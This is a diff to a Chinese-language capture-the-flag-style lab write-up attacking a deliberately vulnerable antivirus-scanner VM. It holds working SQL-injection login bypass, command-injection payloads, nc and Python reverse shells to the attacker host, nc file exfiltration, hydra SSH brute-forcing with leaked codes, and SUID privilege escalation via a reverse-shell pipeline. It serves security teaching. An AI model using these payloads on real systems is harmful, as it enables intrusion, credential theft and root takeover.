@@ -72,7 +72,7 @@
 				</header>
 				<section class="text-body">
 					<h2>引言</h2>
-					<p>中等难度，靶机红队攻防实验#第2篇</p>
+					<p>低难度，靶机红队攻防实验#第3篇，主要掌握SQL的简单注入，验证点的暴力破解，nc命令的灵活使用，SUID提权，BurpSuite的截断重发等。</p>
 					<!-- 目录 -->
 					<h2>文章目录</h2>
 					 <ul class="contents">	
@@ -89,18 +89,336 @@
 					<p>攻击Kali主机IP：192.168.1.123</p>
 					<p>攻击主机与靶机在同一个网段192.168.1.0/24</p>
 
-					<h2 id="Penetration-2">0×2.实战思路</h2>
+					<h2 id="Penetration-2">0×2.实战命令</h2>
+
+					<p>**NAT下靶机无法被扫描到的解决方法</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-bash">
+					#靶机开机，鼠标点进去虚拟机里面，按住键盘shift键，直到出现grub界面
+					#按键盘e键，编辑启动选项，光标移动到linux那一行的最后面
+					#以ubuntu举例，从ro开始替换成rw single init=/bin/bash
+					#修改完后，按ctrl+x重启，进入单用户模式
+					#在单用户模式下通过ip a命令查看网卡标识，例如为eth0
+					#修改配置文件中对应的网卡名称与这里看到的eth0一致
+					#不同系统的网络配置文件不同，可以自己查询
+					#新的ubuntu系统网络配置文件位置：/etc/netplan
+					#老的debain和ub网络配置文件位置：/etc/systemd/network/
+					</code>
+					</pre>
+
 					<p>下面的所有命令都使用root用户执行，如果是普通用户，请在命令前面添加sudo，</p>
 					<p>● 局域网发现</p>
 					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
 					<code class="language-bash">
 					#局域网二层扫描
+					#方法1：
 					#arp-scan -I 网卡名称 -l
 					arp-scan -I eth0 -l
+
+					#方法2：
+					#不做筛选
+					for i in $(seq 1 254); do arping -c 2 192.168.80.$i; done
+					#筛选结果，可以先arping -c 1 192.168.80.1查看有响应的主机返回的数据包样式
+					for i in $(seq 1 254); do arping -c 2 192.168.80.$i; done | grep 64
 					</code>
 					</pre>
 
+					<p>● 三层网络发现，端口服务探测</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-bash">
+					#发现主机后，进行三层扫描
+					nmap -p- 192.168.80.102
 
+					#开放端口版本服务版本探测（如果靶机扫描只有22端口，尝试重启靶机）
+					nmap -p22,8080 -sV 192.168.80.102
+
+					#Werkzeug httpd 8080 
+					#Werkzeug是一个基于python开发语言的工具库，它内置了一个轻量级的HTTP服务，常用于开发和测试。
+					</code>
+					</pre>
+
+					<p>● web服务查看，分析代码逻辑</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-bash">
+					#打开网页192.168.80.123:8080
+					#看起来像是一个在线病毒扫描测试页
+					#并且这个页面需要一个邀请码才能够登录，对于这种拥有身份认证功能的页面
+					#常规的攻击手段一般有两个
+					#第一，使用程序逻辑漏洞通过sql注入的方式绕过登录认证
+					#第二，大力出奇迹，通过暴力破解来强行登录
+					</code>
+					</pre>
+
+					<p>● 尝试第一种方法，SQL注入绕过认证</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-bash">
+					#结合BurpSuite，打开火狐浏览器，设置里面开启proxy
+					#http代理指向127.0.0.1 8080
+					#然后在浏览器访问192.168.80.123:8080
+					#打开proxy中的intercept on拦截
+					#然后右击拦截到的请求，send to intruder
+					#通过intruder重复的数据提交能力，测试这个位置是否包含一些常见的注入漏洞
+					#选中我们提交的数据，add按钮设置成变量
+					#然后通过右边的payload功能，添加上键盘上所有的符号
+
+					#键盘上能够输出的字符集合
+					!
+					"
+					#
+					$
+					%
+					&
+					'
+					(
+					)
+					*
+					+
+					,
+					-
+					.
+					/
+					:
+					;
+					<
+					=
+					>
+					?
+					@
+					[
+					\
+					]
+					^
+					_
+					`
+					{
+					|
+					}
+					~
+
+					#我们知道，键盘上能够输入的这些符号，在一些特定的编程语言中，有着不同的作用
+					#例如括号，双引号，单引号，逗号等等
+					#当我们注入这些键盘上能够输入的符号的时候
+					#就可能触发服务端编程语言的一些逻辑上或者语义上的解析错误
+					#最后我们通过构造特殊的语法就能够利用服务端代码存在的注入漏洞
+					#绕过验证直接拿到想要的数据
+					#现在我们就来测试一下，看看这个地方有没有这些特殊符号的注入漏洞
+					#点击Start attack
+					</code>
+					</pre>
+
+					<p>● 通过注入提交的符号的报错信息，分析代码逻辑</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-bash">
+					#通过检测页面查看到，当测试到双引号的时候
+					#返回的状态码和页面内容和其他的都不相同
+					#在Response的Render功能可以看到，服务器出现了一个Sqlite3的报错
+					#并且在最后一行看到了报错的程序路径以及报错的那一行源码
+					</code>
+					</pre>
+
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-python">
+					@app.route('/login', methods=['POST'])
+					def login():
+					    password = request.form['password']  # 1. 获取用户提交的密码
+					    # 2. 拼接SQL查询语句并执行
+					    if len(c.execute('select * from code where password="' + password + '"').fetchall()) > 0:
+					        session['logged_in'] = True  # 3. 设置登录状态为True
+					        return 'Redirecting to /scan. &lt;meta http-equiv="refresh" content="0; url=/scan" />'  # 4. 返回重定向页面
+					    else:
+					        return "WRONG INFORMATION"  # 5. 返回错误信息
+					</code>
+					</pre>
+
+					<p>● 代码详细分析</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-bash">
+					#SQL语句拼接
+					#将用户输入的 password 直接拼接到 SQL 查询中，生成完整语句：
+					SELECT * FROM code WHERE password="用户输入的密码"
+					#执行查询
+					c.execute() 执行拼接后的 SQL 语句
+					#获取结果集
+					.fetchall() 获取所有匹配的记录，返回一个列表。
+					#条件判断
+					通过 len(结果列表) > 0 判断是否存在匹配记录。若存在，则认为密码正确。
+
+					#预防动态拼接导致的sql注入漏洞的方法
+					user = c.execute('SELECT * FROM code WHERE password = ?', (password,)).fetchone()
+					#使用参数化查询，将 SQL 语句分为固定模板和动态参数两部分
+					</code>
+					</pre>
+
+					<p>● 通过报错获得的信息，尝试注入绕过</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-bash">
+					#删除闭合多余符号后，用双引号构建的攻击语法
+					select * from code where password="" or 1=1 --"
+					</code>
+					</pre>
+
+					<p>第二种方法，暴力破解</p>
+					<p>● 通过报错获得的信息，尝试注入绕过</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-bash">
+					#暴力破解
+					#首先使用第一种方法中相同的步骤结合BurpSuite
+					#打开火狐浏览器，设置里面开启proxy
+					#http代理指向127.0.0.1 8080
+					#然后在浏览器访问192.168.80.123:8080
+					#打开proxy中的intercept on拦截，然后右击拦截到的请求
+					#send to intruder，通过intruder重复的数据提交能力
+					#payload部分，加载一个字典文件
+					#/usr/share/wordlists/nmap.lst
+					#点击Start attack
+					</code>
+					</pre>
+
+					<p>● 测试命令注入漏洞：</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-bash">
+					#测试命令注入漏洞
+					hkmm | id
+
+					#方法1：反弹shell，通过nc
+					hkmm | which nc
+					#服务端nc没有-e参数无法建立连接
+					hkmm | 192.168.80.123 2333 -e /bin/sh 
+					#通过nc与管道命令结合
+					hkmm | nc 192.168.80.123 1234 | /bin/bash | nc 192.168.80.123 2345
+
+					#通过 nc（Netcat）工具连接到目标主机 192.168.80.123 的 1234 端口，并监听该端口的输入数据
+					#将前一个 nc 命令接收到的数据通过管道传递给 /bin/bash（Bash Shell 解释器）执行
+					#将 Bash 执行后的输出结果通过管道传递给第二个 nc 命令，连接到同一目标主机的 2345 端口，并将数据发送到该端口
+
+					#方法2：反弹shell，通过python
+					hkmm | python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.80.123",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+					</code>
+					</pre>
+
+					<p>● 命令注入漏洞源码分析：</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-python">
+					@app.route('/output', methods=['POST'])
+					def output():
+					    if session.get('logged_in'):  # 检查用户会话状态
+					        filename = request.form['filename']  # 获取用户输入的文件名
+					        # 执行clamscan扫描命令（存在命令注入风险）
+					        scan_results = subprocess.Popen(
+					            "clamscan " + filename,
+					            shell=True,  # 高危：允许shell解析输入
+					            stdout=subprocess.PIPE,
+					            stderr=subprocess.PIPE,
+					            stdin=subprocess.PIPE
+					        ).stdout.read()
+					        return "&lt;pre>" + scan_results + "&lt;/pre>"  # 直接输出结果（XSS风险）
+					    else:
+					        return '&lt;meta http-equiv="refresh" content="0; url=/" />'  # 重定向到首页
+					</code>
+					</pre>
+
+					<p>● 根据信息收集看到的sql文件，尝试进行ssh密码的暴力破解：</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-bash">
+					#在靶机目录中发现一个database.sql文件，通过file命令查看一下
+					file database.sql
+					database.sql: SQLite 3.x database, last written using SQLite version 3011000
+					#SQLite是一款轻量级嵌入式关系型数据库，数据库文件一般以单一文件储存在本地
+
+					#使用nc文件传输，将这个sql文件传回攻击主机查看
+					nc -nvlp 4444  > hkmm.sql  #接收端
+					nc 192.168.80.123 4444 < database.sql #传输端
+
+					#使用sqlite3查看
+					sqlite3 #进入sqllite命令环境
+					.open hkmm.sql  #打开sql数据库文件
+					.database #查看当前打开的是哪个数据库文件
+					.dump
+
+					CREATE TABLE `code` (
+					        `password`      TEXT
+					);
+					INSERT INTO code VALUES('myinvitecode123');
+					INSERT INTO code VALUES('mysecondinvitecode');
+					INSERT INTO code VALUES('cloudavtech');
+					INSERT INTO code VALUES('mostsecurescanner');
+					COMMIT;
+
+					.exit #退出sqlite3
+
+					#查看系统中包含哪些可以使用/bin/bash登录的用户，再通过这些密码去尝试登录
+					cat /etc/passwd | grep /bin/bash
+					root:x:0:0:root:/root:/bin/bash
+					cloudav:x:1000:1000:cloudav:/home/cloudav:/bin/bash
+					scanner:x:1001:1001:scanner,,,:/home/scanner:/bin/bash
+
+					#构造登录用户名字典和密码字典
+					echo root > user.txt
+					echo cloudav >> user.txt
+					echo scanner >> user.txt
+
+					echo myinvitecode123 > pass.txt
+					echo mysecondinvitecode >> pass.txt
+					echo cloudavtech >> pass.txt
+					echo mostsecurescanner >> pass.txt
+
+					#一条命命令搞定
+					echo root > user.txt && echo cloudav >> user.txt && echo scanner >> user.txt && echo myinvitecode123 > pass.txt && echo mysecondinvitecode >> pass.txt && echo cloudavtech >> pass.txt && echo mostsecurescanner >> pass.txt
+
+					#hydra 暴力破解
+					hydra -L user.txt -P pass.txt ssh://192.168.80.102
+					</code>
+					</pre>
+
+					<p>● 通过SUID权限位的程序进行提权：</p>
+					<pre data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！'>
+					<code class="language-c">
+					#include &lt;stdio.h>
+
+					int main(int argc, char *argv[])
+					{
+					    char *freshclam = "/usr/bin/freshclam";
+
+					    if (argc < 2) {
+					        printf("This tool lets you update antivirus rules\nPlease supply command line arguments for freshclam\n");
+					        return 1;
+					    }
+
+					    // 动态分配内存拼接命令
+					    char *command = malloc(strlen(freshclam) + strlen(argv[1]) + 2);
+					    sprintf(command, "%s %s", freshclam, argv[1]);
+
+					    // 提升权限至root
+					    setgid(0);
+					    setuid(0);
+
+					    // 执行命令
+					    system(command);
+					    return 0;
+					}
+
+					#内存分配
+					char *command = malloc(strlen(freshclam) + strlen(argv[1]) + 2);
+					#功能：动态分配内存，用于存储拼接后的命令字符串。
+					#参数计算：
+					strlen(freshclam) #计算固定路径字符串/usr/bin/freshclam的长度（假设为17）。
+					strlen(argv[1]) #计算用户输入参数的长度（假设为N）。
+					+2 #为字符串结束符\0和可能的空格预留空间
+
+					#潜在问题：
+					#缓冲区溢出：若用户输入的argv[1]过长，可能导致分配的内存不足。
+					#未验证分配结果：未检查malloc是否成功（可能返回NULL）。
+
+					#由于原C程序使用sprintf拼接命令，管道符会被视为命令分隔符，导致system执行多个命令
+
+					-rwsr-xr-x 1 root    scanner 8576 Oct 24  2018 update_cloudav
+					#rws为文件所有者的权限，这个文件的可执行权限被设置成了s
+					#所以这个程序执行时会临时获得所有者（root）权限
+
+					#提权
+					./update_cloudav "nc 192.168.80.123 6666 | /bin/bash | nc 192.168.80.123 8888"
+					</code>
+					</pre>
 
 					<h2 id="Penetration-3">0×3.视频演示</h2>
 
